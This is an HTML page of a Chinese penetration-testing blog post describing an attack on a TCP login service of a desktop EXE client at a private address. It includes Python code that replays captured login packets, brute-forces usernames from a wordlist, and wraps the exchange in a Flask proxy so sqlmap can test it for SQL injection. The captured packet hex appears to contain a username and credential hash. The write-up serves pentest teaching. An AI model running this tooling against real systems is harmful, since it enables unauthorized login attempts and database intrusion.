@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="基础信息应用类型：EXE协议：TCP后端地址：192.168.103.174:400 渗透测试TCP连接基础知识：TCP连接的建立和关闭遵循以下顺序：  客户端发起连接请求：客户端向服务器端发送一个SYN包（同步包）。 服务器端响应连接请求：服务器端收到客户端发送的SYN包后，向客户端发送一个SYN-ACK包（同步-确认包）。 客户端确认连接：客户端收到服务器端发送的SYN-ACK包后，向服务器端">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCP应用SQL注入">
+<meta property="og:url" content="http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Z1sec-Blog">
+<meta property="og:description" content="基础信息应用类型：EXE协议：TCP后端地址：192.168.103.174:400 渗透测试TCP连接基础知识：TCP连接的建立和关闭遵循以下顺序：  客户端发起连接请求：客户端向服务器端发送一个SYN包（同步包）。 服务器端响应连接请求：服务器端收到客户端发送的SYN包后，向客户端发送一个SYN-ACK包（同步-确认包）。 客户端确认连接：客户端收到服务器端发送的SYN-ACK包后，向服务器端">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240331224246.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240331224030.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240331224424.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240331224807.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240331225732.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240331225936.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240331230511.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020240331230710.png">
+<meta property="article:published_time" content="2024-07-04T13:22:42.000Z">
+<meta property="article:modified_time" content="2024-07-04T13:25:08.973Z">
+<meta property="article:author" content="z1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Pasted%20image%2020240331224246.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>TCP应用SQL注入</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/parttime/index.html">PartTime</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/07/08/%E8%99%9A%E6%8B%9F%E5%8C%96%E5%BA%94%E7%94%A8%E6%94%BB%E5%87%BB%E7%AD%96%E7%95%A5/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/04/Java%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Dnslog%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&text=TCP应用SQL注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&title=TCP应用SQL注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&is_video=false&description=TCP应用SQL注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=TCP应用SQL注入&body=Check out this article: http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&title=TCP应用SQL注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&title=TCP应用SQL注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&title=TCP应用SQL注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&title=TCP应用SQL注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&name=TCP应用SQL注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&t=TCP应用SQL注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">基础信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">渗透测试</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        TCP应用SQL注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">z1</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-04T13:22:42.000Z" class="dt-published" itemprop="datePublished">2024-07-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h1><p>应用类型：EXE<br>协议：TCP<br>后端地址：192.168.103.174:400</p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>TCP连接基础知识：<br>TCP连接的建立和关闭遵循以下顺序：</p>
+<ol>
+<li>客户端发起连接请求：客户端向服务器端发送一个SYN包（同步包）。</li>
+<li>服务器端响应连接请求：服务器端收到客户端发送的SYN包后，向客户端发送一个SYN-ACK包（同步-确认包）。</li>
+<li>客户端确认连接：客户端收到服务器端发送的SYN-ACK包后，向服务器端发送一个ACK包（确认包），完成连接的建立。</li>
+<li>数据传输：建立连接后，客户端和服务器端可以进行数据传输。</li>
+<li>连接关闭：当数据传输完成后，需要关闭连接。</li>
+<li>客户端发起关闭连接请求：客户端向服务器端发送一个FIN包（结束包）。</li>
+<li>服务器端响应关闭请求：服务器端收到客户端发送的FIN包后，向客户端发送一个ACK包，表示确认收到关闭请求。</li>
+<li>服务器端关闭连接：服务器端向客户端发送一个FIN包。</li>
+<li>客户端响应关闭请求：客户端收到服务器端发送的FIN包后，向服务器端发送一个ACK包，完成连接的关闭。</li>
+</ol>
+<p>当前数据连接记录：<br><img src="/images/Pasted%20image%2020240331224246.png"></p>
+<p>使用wireshark抓包，追踪登陆点TCP流：<br><img src="/images/Pasted%20image%2020240331224030.png"></p>
+<p>转换为：raw模式（hex）<br>蓝色为响应，红色为发送包<br><img src="/images/Pasted%20image%2020240331224424.png"></p>
+<p>可以逐步构建脚本，尝试重发此TCP数据包</p>
+<ul>
+<li><p>创建TCP连接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="comment"># 定义目标主机和端口</span></span><br><span class="line">    target_host = <span class="string">&#x27;192.168.103.174&#x27;</span></span><br><span class="line">    target_port = <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个socket对象</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接到目标主机和端口</span></span><br><span class="line">    client.connect((target_host, target_port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送第一条数据</span></span><br><span class="line">    client.send(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># 接收第一次响应数据</span></span><br><span class="line">    response1 = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="comment"># print(response1)</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>发送第一个数据包：<br>对应这个数据<br><img src="/images/Pasted%20image%2020240331224807.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第二次发送</span></span><br><span class="line">hex_data2 = <span class="string">&#x27;00000300102713000000494e49545f696e69745f494e4954004e020000&#x27;</span></span><br><span class="line">decoded_data = <span class="built_in">bytes</span>.fromhex(hex_data2)</span><br><span class="line">client.send(decoded_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收第二次响应数据</span></span><br><span class="line">response2 = client.recv(<span class="number">4096</span>)</span><br><span class="line"><span class="comment"># print(response2)</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>接下来以此类推，完整发包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">username</span>):</span><br><span class="line">    <span class="comment"># 定义目标主机和端口</span></span><br><span class="line">    target_host = <span class="string">&#x27;192.168.103.174&#x27;</span></span><br><span class="line">    target_port = <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个socket对象</span></span><br><span class="line">    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 连接到目标主机和端口</span></span><br><span class="line">    client.connect((target_host, target_port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送第一条数据</span></span><br><span class="line">    client.send(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># 接收第一次响应数据</span></span><br><span class="line">    response1 = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="comment"># print(response1)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二次发送</span></span><br><span class="line">    hex_data2 = <span class="string">&#x27;00000300102713000000494e49545f696e69745f494e4954004e020000&#x27;</span></span><br><span class="line">    decoded_data = <span class="built_in">bytes</span>.fromhex(hex_data2)</span><br><span class="line">    client.send(decoded_data)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收第二次响应数据</span></span><br><span class="line">    response2 = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="comment"># print(response2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三次发送</span></span><br><span class="line">    hex_data3 = <span class="string">&#x27;0000030011274e020000000000004102000041020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000040000000008000000436f436c69656e74000100000020002001000000000000000000000000000000000000000000000000000000000000000000000000000000000000006c7a7570636f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000061646d696e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000653130616463333934396261353961626265353665303537663230663838336500404c4f47494e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000303035303536633030303031000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line">    original_bytes = <span class="built_in">bytes</span>.fromhex(hex_data3)</span><br><span class="line">    <span class="comment"># 要替换的部分</span></span><br><span class="line">    replacement_part = <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(username)</span><br><span class="line">    <span class="comment"># 将要替换的部分转换为字节数据</span></span><br><span class="line">    replacement_bytes = <span class="built_in">bytes</span>.fromhex(replacement_part)</span><br><span class="line">    replace_index = original_bytes.index(<span class="string">b&#x27;\x61\x64\x6d\x69\x6e&#x27;</span>)</span><br><span class="line">    <span class="comment"># 进行替换</span></span><br><span class="line">    new_bytes = original_bytes[:replace_index] + replacement_bytes + original_bytes[replace_index + <span class="built_in">len</span>(replacement_bytes):]</span><br><span class="line">    new_hex_string = new_bytes.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="comment"># print(bytes.fromhex(new_hex_string).decode(&#x27;ascii&#x27;))</span></span><br><span class="line">    client.send(<span class="built_in">bytes</span>.fromhex(new_hex_string))</span><br><span class="line">    response3 = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="comment"># print(bytes.fromhex(response3.hex()).decode(&#x27;ascii&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第4次发送</span></span><br><span class="line">    hex_data4 = <span class="string">&#x27;0000030012270b000000454e445f656e645f454e44&#x27;</span></span><br><span class="line">    decoded_data = <span class="built_in">bytes</span>.fromhex(hex_data4)</span><br><span class="line">    client.send(decoded_data)</span><br><span class="line">    response4 = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(response4.<span class="built_in">hex</span>()).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>))</span><br><span class="line">    out = <span class="built_in">bytes</span>.fromhex(response4.<span class="built_in">hex</span>()).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    <span class="comment"># if &quot;NOUSER&quot; not in  str(bytes.fromhex(response4.hex()).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)):</span></span><br><span class="line">    <span class="comment">#     print(&quot;Success:&quot;,username)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第5次发送</span></span><br><span class="line">    hex_data5 = <span class="string">&#x27;000003001327040000006e657874&#x27;</span></span><br><span class="line">    decoded_data = <span class="built_in">bytes</span>.fromhex(hex_data5)</span><br><span class="line">    client.send(decoded_data)</span><br><span class="line">    response5 = client.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="comment"># print(response5.hex())</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 关闭连接</span></span><br><span class="line">    client.close()</span><br><span class="line">    <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>在实际测试中存在各样问题，例如：我流量使用的用户名是admin，如果我在数据包中直接替换admin为admins，程序将会无法正常响应，原因是因为如果数据包的长度发生改变，客户端接受将可能出现问题，<strong>下面仅作为事例</strong>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin</span></span><br><span class="line">00000300102713000000494e49545f696e69745f494e4954004e020000</span><br><span class="line"><span class="comment"># admins</span></span><br><span class="line">00000300102713000000494e49545f696e69745f494e4954004e02670000</span><br></pre></td></tr></table></figure>
+<p>假设<code>f696e69745f494e4954004e02</code>是admin，我将用户名替换为admins将会把流量多加了两位（非专业言论，仅做解释）<code>f696e69745f494e4954004e0267</code>。</p>
+<p>问题解决：<br>使用wireshark抓包，分别抓用户名是admin和admins时的数据包，对比其变化：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># admin</span></span><br><span class="line"><span class="number">0000030011274e02000000000000410200004</span>1020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000040000000008000000436f436c69656e74000100000020002001000000000000000000000000000000000000000000000000000000000000000000000000000000000000006c7a7570636f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000061646d696e00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000653130616463333934396261353961626265353665303537663230663838336500404c4f47494e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000303035303536633030303031000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># admins</span></span><br><span class="line"><span class="number">0000030011274e02000000000000410200004</span>1020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004000000040000000008000000436f436c69656e74000100000020002001000000000000000000000000000000000000000000000000000000000000000000000000000000000000006c7a7570636f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000061646d696e73000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000653130616463333934396261353961626265353665303537663230663838336500404c4f47494e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000303035303536633030303031000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure>
+<p>区别在于：admins多出来的s实际上是占用了后面的00<br><img src="/images/Pasted%20image%2020240331225732.png"></p>
+<p>了解到了区别也就好调试了，修改替换部分代码：<br><img src="/images/Pasted%20image%2020240331225936.png"></p>
+<p>接着就可以简单写个for循环去调用send_data进行暴力破解了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;常用用户名.txt&quot;</span>).readlines():</span><br><span class="line">    u = <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(user)</span><br><span class="line">    user = u.strip().encode().<span class="built_in">hex</span>()</span><br><span class="line">    o = send_data(user)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020240331230511.png"></p>
+<p>此外还可以写个flask，接受下参数，再中转给send_data方法，这样就可以使用sqlmap跑注入了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">id</span> = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    u = <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>)</span><br><span class="line">    user = u.strip().encode().<span class="built_in">hex</span>()</span><br><span class="line">    o = send_data(user)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;o&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="/images/Pasted%20image%2020240331230710.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/parttime/index.html">PartTime</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">基础信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">渗透测试</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&text=TCP应用SQL注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&title=TCP应用SQL注入"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&is_video=false&description=TCP应用SQL注入"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=TCP应用SQL注入&body=Check out this article: http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&title=TCP应用SQL注入"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&title=TCP应用SQL注入"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&title=TCP应用SQL注入"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&title=TCP应用SQL注入"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/04/TCP%E5%BA%94%E7%94%A8SQL%E6%B3%A8%E5%85%A5/&name=TCP应用SQL注入&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
